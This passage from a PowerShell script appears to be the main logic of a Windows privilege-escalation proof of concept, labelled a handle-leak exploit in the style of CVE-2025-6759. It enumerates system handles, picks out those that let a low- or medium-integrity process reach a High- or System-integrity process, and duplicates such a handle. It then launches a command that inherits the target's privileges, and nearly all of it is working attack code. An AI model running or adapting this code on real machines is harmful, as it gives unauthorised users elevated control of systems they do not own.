            Write-Host "[+] Process should have inherited privileges from target process $TargetPid" -ForegroundColor Green
            
            [NativeMethodsV2]::CloseHandle($processInfo.hProcess) | Out-Null
            [NativeMethodsV2]::CloseHandle($processInfo.hThread) | Out-Null
            
            if ($OwnerPid -ne $currentPid) {
                [NativeMethodsV2]::CloseHandle($HandleValue) | Out-Null
            }
            
            return $true
        } else {
            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "Failed to create process. Error: $lastError"
            if ($OwnerPid -ne $currentPid) {
                [NativeMethodsV2]::CloseHandle($HandleValue) | Out-Null
            }
            return $false
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($attributeList)
    }
}

#endregion

#region Main Logic

function Invoke-HandleExploit {
    Write-Host "Handle Leak Exploit PoC (CVE-2025-6759 style)" -ForegroundColor Cyan
    Write-Host ""
    
    # Manual handle mode
    if ($ManualHandle -ne "") {
        if ($TargetPid -eq 0) {
            Write-Error "Manual handle mode requires -TargetPid to specify the owner process."
            return
        }
        
        if (-not $Exploit) {
            Write-Warning "Manual handle mode requires -Exploit switch"
            return
        }
        
        Write-Host "[*] Manual handle mode" -ForegroundColor Yellow
        Write-Host "    Target PID: $TargetPid" -ForegroundColor Gray
        Write-Host "    Handle: $ManualHandle" -ForegroundColor Gray
        
        # Parse handle value
        $handleValueStr = $ManualHandle
        if ($handleValueStr -notmatch "^0x") {
            $handleValueStr = "0x$handleValueStr"
        }
        
        try {
            $handleValue = [IntPtr]::new([Convert]::ToInt64($handleValueStr, 16))
        } catch {
            Write-Error "Invalid handle value format: $ManualHandle"
            return
        }
        
        # Try to duplicate and identify the target
        $hOwnerProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_DUP_HANDLE, $false, $TargetPid)
        if ($hOwnerProcess -eq [IntPtr]::Zero) {
            Write-Error "Failed to open target process $TargetPid. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return
        }
        
        $hCurrentProcess = [NativeMethodsV2]::OpenProcess([NativeMethodsV2]::PROCESS_ALL_ACCESS, $false, [System.Diagnostics.Process]::GetCurrentProcess().Id)
        if ($hCurrentProcess -eq [IntPtr]::Zero) {
            [NativeMethodsV2]::CloseHandle($hOwnerProcess) | Out-Null
            Write-Error "Failed to open current process"
            return
        }
        
        $hDup = [IntPtr]::Zero
        $dupStatus = [NativeMethodsV2]::NtDuplicateObject(
            $hOwnerProcess,
            $handleValue,
            $hCurrentProcess,
            [ref]$hDup,
            0,
            0,
            0
        )
        
        [NativeMethodsV2]::CloseHandle($hOwnerProcess) | Out-Null
        [NativeMethodsV2]::CloseHandle($hCurrentProcess) | Out-Null
        
        if ($dupStatus -ne 0 -or $hDup -eq [IntPtr]::Zero) {
            Write-Error "Failed to duplicate handle. Status: 0x$($dupStatus.ToString('X8'))"
            return
        }
        
        $targetPid = [NativeMethodsV2]::GetProcessId($hDup)
        [NativeMethodsV2]::CloseHandle($hDup) | Out-Null
        
        if ($targetPid -eq 0) {
            Write-Error "Handle does not point to a valid process"
            return
        }
        
        Write-Host "[+] Handle points to process $targetPid" -ForegroundColor Green
        
        # Attempt exploitation
        $success = Invoke-ExploitProcess -OwnerPid $TargetPid -HandleValue $handleValue -TargetPid $targetPid -Command $Command
        if ($success) {
            Write-Host "[+] Exploitation successful!" -ForegroundColor Green
        }
        return
    }
    
    if ($TargetPid -ne 0) {
        Write-Host "[*] Scanning handles in process $TargetPid" -ForegroundColor Yellow
    } elseif ($TargetTid -ne 0) {
        Write-Host "[*] Scanning for handles targeting Thread ID $TargetTid..." -ForegroundColor Yellow
    } else {
        Write-Host "[*] Scanning all system handles..." -ForegroundColor Yellow
    }
    
    $handles = Get-SystemHandles -FilterPid $TargetPid

    # Filter by TargetTid if specified
    if ($TargetTid -ne 0) {
        $handles = $handles | Where-Object { $_.TargetTid -eq $TargetTid }
    }
    
    if ($handles.Count -eq 0) {
        Write-Host "[-] No interesting handles found" -ForegroundColor Red
        return
    }
    
    Write-Host "[+] Found $($handles.Count) interesting handles" -ForegroundColor Green
    Write-Host ""
    
    # Filter for "golden" handles: Low/Medium integrity owner -> High/System integrity target
    $vulnerableHandles = @()
    
    foreach ($handle in $handles) {
        $ownerLevel = $handle.OwnerIntegrity
        $targetLevel = $handle.TargetIntegrity
        
        if (($ownerLevel -eq "Low" -or $ownerLevel -eq "Medium") -and 
            ($targetLevel -eq "High" -or $targetLevel -eq "System")) {
            $vulnerableHandles += $handle
        }
    }
    
    if ($vulnerableHandles.Count -eq 0) {
        Write-Host "[-] No vulnerable handles found (Low/Medium -> High/System)" -ForegroundColor Red
        Write-Host ""
        Write-Host "All interesting handles:" -ForegroundColor Yellow
        $handles | Format-Table -AutoSize
        return
    }
    
    Write-Host "[!] Found $($vulnerableHandles.Count) VULNERABLE handles!" -ForegroundColor Red
    Write-Host ""
    
    # Display with HandleValueHex for readability
    $vulnerableHandles | Select-Object OwnerPid, OwnerIntegrity, HandleValueHex, HandleType, TargetPid, TargetTid, TargetIntegrity, AccessRights, GrantedAccess | Format-Table -AutoSize
    
    if ($Exploit) {
        Write-Host ""
        Write-Host "[*] Exploitation mode enabled" -ForegroundColor Yellow
        
        $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        
        foreach ($handle in $vulnerableHandles) {
            if ($handle.HandleType -eq "Process" -and $handle.TargetPid) {
                # Convert handle value from UInt64 to IntPtr (handle value in owner process)
                $handleValue = [IntPtr]::new([Int64]$handle.HandleValue)
                
                if ($handle.OwnerPid -eq $currentPid) {
                    Write-Host ""
                    Write-Host "[*] Found handle in current process - attempting exploitation..." -ForegroundColor Yellow
                    $success = Invoke-ExploitProcess -OwnerPid $handle.OwnerPid -HandleValue $handleValue -TargetPid $handle.TargetPid -Command $Command
                    if ($success) {
                        Write-Host "[+] Exploitation successful!" -ForegroundColor Green
                        break
                    }
                } else {
                    Write-Host ""
                    Write-Host "[!] Handle is in process $($handle.OwnerPid), not current process ($currentPid)" -ForegroundColor Yellow
                    Write-Host "    Attempting to duplicate handle..." -ForegroundColor Gray
                    $success = Invoke-ExploitProcess -OwnerPid $handle.OwnerPid -HandleValue $handleValue -TargetPid $handle.TargetPid -Command $Command
                    if ($success) {
                        Write-Host "[+] Exploitation successful!" -ForegroundColor Green
                        break
                    }
                }
            }
        }
    } else {
        Write-Host ""
        Write-Host "[*] Use -Exploit switch to attempt exploitation" -ForegroundColor Yellow
    }
}

#endregion

# Execute main function
Invoke-HandleExploit

